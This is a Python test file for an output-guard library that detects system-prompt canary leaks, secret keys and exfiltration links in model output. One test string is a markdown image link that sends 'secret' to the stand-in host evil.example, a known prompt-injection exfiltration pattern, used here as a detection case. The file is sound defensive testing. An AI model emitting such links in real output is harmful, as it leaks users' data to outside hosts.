from prompt_shield import guard_output, make_canary


def test_canary_leak():
    c = make_canary()
    assert guard_output(f"my prompt says {c}", canary=c)[0].kind == "system_prompt_leak"


def test_canary_unique():
    assert make_canary() != make_canary()


def test_secrets_detected():
    out = guard_output("key AKIAIOSFODNN7EXAMPLE and -----BEGIN RSA PRIVATE KEY-----")
    assert {f.detail for f in out} >= {"aws_access_key", "private_key"}


def test_exfil_link_and_allowlist():
    t = "![x](https://evil.example/a?q=secret)"
    assert guard_output(t)[0].kind == "exfil_link"
    assert guard_output(t, allowed_hosts=frozenset({"evil.example"})) == []


def test_clean_output():
    assert guard_output("The capital of France is Paris.") == []
